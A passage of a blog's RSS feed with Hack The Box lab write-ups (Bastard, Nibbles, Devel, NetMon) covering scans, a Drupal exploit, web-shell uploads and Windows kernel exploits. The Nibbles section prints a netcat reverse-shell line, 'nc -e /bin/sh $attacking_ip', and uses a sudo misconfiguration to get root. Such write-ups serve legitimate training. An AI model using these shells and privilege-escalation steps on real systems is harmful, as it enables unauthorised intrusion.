</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 12:23 CET
Nmap scan report for bastard.htb (10.129.90.188)
Host is up (0.024s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   23.34 ms 10.10.14.1
2   23.46 ms bastard.htb (10.129.90.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
</code></pre></td></tr></table>
</div>
</div><p>We also run our team of usual&rsquo;s suspects tools, such as <code>nikto</code> and <code>gobuster</code> and manually <code>browsing</code> with <code>Burp</code> enabled.</p>
<p>We&rsquo;ll notice a <code>Drupal 7.54</code> installation which is vulnerable to <a href="https://github.com/dreadlocked/Drupalgeddon2" target="_blank" rel="noopener noreffer ">Drupalgeddon 2</a> :</p>
<p></p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>Manually exploiting the vuln with the ruby script found during our recon will give us an initial shell as <code>authority\iusr</code> :</p>
<p></p>
<p>It is now time for internal recon, before we try to escalate our privs!</p>
<h3 id="privesc">PrivEsc</h3>
<p>Since our shell is quite limited, we&rsquo;ll have to find several to get what we want. For example, running winpeas and similar tools won&rsquo;t work. It will time out before we can get the results, and I couldn&rsquo;t find a way to write the output to a logfile.</p>
<p>After searching, I found <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreffer ">Windows Exploit Suggester</a>. It is a <code>python2 script</code> that works on my attacking machine from the output of the <code>systeminfo</code> command :</p>
<p></p>
<p>So going down the list I found one kernel exploit that seemed particularly interesting : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreffer ">MS10-059</a>.</p>
<p>Once uploaded, just run it without argument and it&rsquo;ll tell you that it requires an IP and port, in order to pop a reverse shell.</p>
<p>So I ran it like so :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">MS10-059.exe &#34;$attacking_ip&#34; &#34;1234&#34;
</code></pre></td></tr></table>
</div>
</div><p>Hopefully, it worked and gave me <code>SYSTEM</code> :</p>
<p></p>
<p>Harvest flag and call it a day :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>This has been my first even &ldquo;medium&rdquo; rated box and I am very happy I did it on my own. I found this initial shell pretty easy, but then got quite confused when I couldn&rsquo;t work with <code>winpeas</code> and other executables. This is when I started researching for other way to enum the box and found the <code>python exploit suggester</code>. From, here it was some googling and mor trial and error, but it worked!</p>
]]></description></item><item><title>HTB - Nibbles without MetaSploit</title><link>https://www.masoopy.com/htb-nibbles-without-metasploit/</link><pubDate>Wed, 17 Feb 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-nibbles-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/Nibbles_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Easy box, according to HTB notation, also not a very good user&rsquo;s rating. Let&rsquo;s see what it is about!</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/121" target="_blank" rel="noopener noreffer ">HTB - Nibbles</a></p>
<h2 id="recon">Recon</h2>
<p>Quick recon according to logo and info :</p>
<ul>
<li>Linux box ;</li>
<li>Misc : web, misconfiguration.</li>
</ul>
<h2 id="enum">Enum</h2>
<p>Classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 16:42 CET
Nmap scan report for $target_ip
Host is up (0.023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn&#39;t have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=31405%PV=Y%DS=2%DC=T%G=Y%TM=602D399
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   23.69 ms 10.10.14.1
2   24.01 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
</code></pre></td></tr></table>
</div>
</div><h3 id="web-scanning">Web scanning</h3>
<p>Let&rsquo;s enumerate web folders in CLI, for a change :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$target_ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php

</code></pre></td></tr></table>
</div>
</div><p>This won&rsquo;t give us much information, however by browsing to the website and checking its source we find a new URL :</p>
<p></p>
<p>We fire <code>gobuster</code> one more time, with this new URL :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$target_ip/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php

</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$target_ip/nibbleblog/
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/17 16:54:47 Starting gobuster
===============================================================
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/languages (Status: 301)
/index.php (Status: 200)
/content (Status: 301)
/sitemap.php (Status: 200)
===============================================================
2021/02/17 16:55:21 Finished
===============================================================p
</code></pre></td></tr></table>
</div>
</div><p>It will reveal juicier info, such as <code>admin.php</code>, <code>install.php</code>, <code>sitemap</code>, etc.</p>
<p>Going to <code>install.php</code> will tell us the site is already installed and propose to upgrade it which will eventually leak <code>NibbleBlog version 4.0.3</code> :</p>
<p></p>
<p>By checking source code on Github, we also find juicy directory in <code>/content/private</code> :</p>
<p></p>
<p>Now checking <code>searchsploit</code> we find that our version is vulnerable to <a href="https://www.exploit-db.com/exploits/38489" target="_blank" rel="noopener noreffer ">Authenticated Arbitrary File Upload</a>. It means we need to get the credentials.</p>
<p>By looking inside the users.xml file we can suppose that <code>admin</code> is the login.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Now, we could try to brute force the admin area, however it won&rsquo;t be effective since Nibbleblog will temporarily block our IP after a few attempts:</p>
<p></p>
<p>Here, again, I spent way more time than I care to admit. You have to find the password, but can&rsquo;t &ldquo;crack&rdquo; it which means we have to guess it. I tried a lot of stuff&hellip; but couldn&rsquo;t find it, so I cheated&hellip; again!</p>
<p>We know the password is <code>admin</code>, and the password is <code>nibbles</code>, like the box&rsquo;s name (which I tried), but I uesd a capital <code>N</code>.</p>
<p></p>
<p>Now that we have our credentials, we can finally start playing with the CVE we found earlier! Since, we are trying to solve this without MetaSploit, we need to find a <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html" target="_blank" rel="noopener noreffer ">manual way</a> to exploit our target.</p>
<h3 id="getting-initial-shell">Getting initial shell</h3>
<p>Let&rsquo;s create a [php shell(https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)], thanks to Pentest Monkey and upload it via the Image plugin located at <code>http://$target_ip/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</code>, then we will run shell my going to this URL : <code>http://$target_ip/nibbleblog/content/private/plugins/my_image/image.php</code>. The filename will always be <code>image.ext</code> with <code>ext</code> being the &ldquo;real&rdquo; extension.</p>
<p>NB : do not forget to start your listener : <code>nc -nlvp 1234</code>.</p>
<p>And we are in, unfortunately as <code>nibbler</code> and not <code>root</code> :</p>
<p></p>
<p>Let&rsquo;s still grab the user flag :</p>
<p></p>
<p>And now&hellip; we need to escalate our priv!</p>
<h3 id="privesc">PrivEsc</h3>
<p>Before we can have a chance to elevate our privs, we should do more <a href="https://www.masoopy.com/cheatsheets/got-shell/" target="_blank" rel="noopener noreffer ">internal recon</a>.</p>
<p>We&rsquo;ll upload <a href="https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" target="_blank" rel="noopener noreffer ">LSE</a>, in order to check for any &ldquo;entry points&rdquo; to privileges escalation.</p>
<p>We will serve our script via <code>sudo python2 -m SimpleHTTPServer 80</code> since our target doesn&rsquo;t seem to resolve Github&rsquo;s domain&rsquo;s and download it with <code>curl</code>.</p>
<p>Once it downloaded, give it exec right, then run it. Something interesting will come up :</p>
<p></p>
<p>This means that we&rsquo;ll be able to run anything as <code>root</code> as long as it is in <code>/home/nibbler/personal/stuff/monitor.sh</code>.</p>
<p>All right! Let&rsquo;s try to run a reverse shell :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">cd /home/nibbler
echo &#34;#!/bin/bash&#34; &gt; personal/stuff/monitor.sh
echo &#34;nc -e &#34;/bin/sh&#34; $attacking_ip 1235&#34; &gt;&gt; personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh
</code></pre></td></tr></table>
</div>
</div><p>Now we run it :</p>
<p><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></p>
<p>NB : don&rsquo;t forget to start the listener on your attacking machine.</p>
<p>And that&rsquo;s it, we have root :</p>
<p></p>
<p>And we grab the last flag  :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>Let me be blunt. Getting the admin&rsquo;s password sucked, and was no fun at all. By judging from the comments on the forum and the poor notation, I guess I wasn&rsquo;t the only one really frustrated while trying to get initial access. However, once I was in, while it was pretty easy, it was also super fun and really enjoyed this box!</p>
]]></description></item><item><title>HTB - Devel without MetaSploit</title><link>https://www.masoopy.com/htb-devel-without-metasploit/</link><pubDate>Tue, 16 Feb 2021 15:26:14 +0100</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-devel-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/Devel_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Pretty fast and obvious box. Let me guide through my pwn:</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/3" target="_blank" rel="noopener noreffer ">HTB - Devel</a></p>
<h2 id="recon">Recon</h2>
<p>Usual recon here, based on logo and info :</p>
<ul>
<li>Windows box ;</li>
<li>Misc : FTP, <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank" rel="noopener noreffer ">Arbitrary file upload</a>.</li>
</ul>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA nmap $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text"># Nmap 7.91 scan initiated Tue Feb 16 14:42:03 2021 as: nmap -T4 -A -p- -oA nmap $target_ip
Nmap scan report for $target_ip
Host is up (0.023s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   23.39 ms 10.10.14.1
2   23.58 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 16 14:43:43 2021 -- 1 IP address (1 host up) scanned in 100.14 seconds
</code></pre></td></tr></table>
</div>
</div><p>Our scan reveals an open FTP and a web server. Based on our initial recon, I guess we&rsquo;ll have to upload a malicious file via FTP and run it via the IIS web server!</p>
<p>Before attacking, we&rsquo;ll check <code>searchsploit</code> for anything interesting, but nothing will come up.</p>
<p>Let&rsquo;s start exploiting directly!</p>
<h2 id="exploitation">Exploitation</h2>
<p>The server is running IIS, so let&rsquo;s try to upload an <code>aspx</code> shell.</p>
<h3 id="getting-initial-shell">Getting initial shell</h3>
<p>A quick search brought me to <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx" target="_blank" rel="noopener noreffer ">this one</a>, I uploaded it inside the root of the web dir, and it worked !</p>
<p></p>
<p>Unfortunately, we are not <code>SYSTEM</code> and can&rsquo;t even access user&rsquo;s flag which seems to be called <code>babis</code>. It&rsquo;s time to escalate our privileges! But first, we should do recon from inside, let&rsquo;s upload the <code>winpeas.bat</code> file and execute as below :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">&#34;C:\inetpub\wwwroot\winPEAS.bat log&#34; 
</code></pre></td></tr></table>
</div>
</div><p>This will generate a lot of info about Windows version, patches applied (or not), user rights, etc. This is a goldmine!</p>
<h3 id="privesc">PrivEsc</h3>
<p>Now, <a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener noreffer ">from what I learned</a>, a good way to escalate privileges is to look for missing patches and related vuln that would give those wanted priv.</p>
<p>Our WinPEAS log file showed the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">&#34;Microsoft Windows 7 Enterprise   &#34; 
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
MS04-020 patch is NOT installed 2K/SP4-POSIX)
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
</code></pre></td></tr></table>
</div>
</div><p>Inside this list, I narrowed it down in order to match the system I was attacking : <code>Windows 7 Enterprise 6.1.7600 N/A Build 7600</code>, which is <code>SP0</code> according to a quick web search.</p>
<p>Then I &ldquo;randomly&rdquo; (not totally randoms : it matches the target&rsquo;s OS) tried the <code>MS11-011</code> vuln, without luck.</p>
<p>Then, I tried <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreffer ">MS10-059</a>.  For this one, I had to run a listener on my attack box, then run the malicious file like shown below :</p>
<p></p>
<p>NB : I simply uploaded the malicious file via FTP to the <code>wwwroot</code> dir.</p>
<p>And it got me <code>SYSTEM</code> :</p>
<p></p>
<p>Now getting <code>user</code> and <code>root</code> flags was just a matter of browsing to the correct directories and printing the content of the files:</p>
<p></p>
<p></p>
<h2 id="outro">Outro</h2>
<p>After my <a href="https://www.masoopy.com/htb-netmon/" target="_blank" rel="noopener noreffer ">debacle</a> from the last box, it felt awesome to be able to pwn this one easily. I feel my efforts are starting to pay off and that I begin to get the &ldquo;hang of it&rdquo;. Hacker&rsquo;s mind in coming, and it is good!</p>
]]></description></item><item><title>HTB - NetMon without MetaSploit</title><link>https://www.masoopy.com/htb-netmon-without-metasploit/</link><pubDate>Fri, 12 Feb 2021 14:56:25 +0100</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-netmon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/NetMon_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>An easy box according to HTB ranking and a not so easy one according to <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#" target="_blank" rel="noopener noreffer ">this site</a>. For me, it was really painful. Let me overshare!</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/177" target="_blank" rel="noopener noreffer ">HTB - NetMon</a></p>
<h2 id="recon">Recon</h2>
<p>Quick recon based on HTB logo and info :</p>
<ul>
<li>Windows box ;</li>
<li>Misc info : web, PowerShell, file misconfiguration ;</li>
<li>Probably runs PRTG NetWork Monitor tool.</li>
</ul>
<h2 id="enum">Enum</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA nmap $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
